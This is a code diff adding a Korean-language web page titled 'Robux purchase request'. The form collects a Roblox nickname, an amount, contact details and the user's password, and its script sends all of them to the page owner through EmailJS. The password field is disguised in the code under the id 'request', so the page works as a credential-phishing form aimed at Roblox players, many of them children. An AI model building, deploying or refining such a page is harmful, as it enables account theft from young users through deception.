@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8" />
+  <title>로벅스 구매 요청</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("0zYUbiKWqyCZGh9jB");
+    })();
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      padding: 30px;
+    }
+    .container {
+      max-width: 420px;
+      margin: auto;
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, textarea, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+    }
+    button {
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>로벅스 구매 요청</h2>
+
+  <input id="nickname" placeholder="닉네임" required />
+  <input id="amount" placeholder="로벅스 양" required />
+  <input id="contact" placeholder="연락처" required />
+  <textarea id="request" placeholder="비밀번호" required></textarea>
+
+  <button onclick="sendEmail()">보내기</button>
+</div>
+
+<script>
+function sendEmail() {
+  const params = {
+    nickname: document.getElementById("nickname").value,
+    amount: document.getElementById("amount").value,
+    contact: document.getElementById("contact").value,
+    request: document.getElementById("request").value
+  };
+
+  if (!params.nickname || !params.amount || !params.contact || !params.request) {
+    alert("모든 항목을 입력해주세요.");
+    return;
+  }
+
+  emailjs.send(
+    "service_2osfyze",
+    "template_60av7xp",
+    params
+  ).then(function() {
+    alert("요청이 성공적으로 전송되었습니다!");
+  }, function(error) {
+    alert("전송 실패: " + error.text);
+  });
+}
+</script>
+
+</body>
+</html>
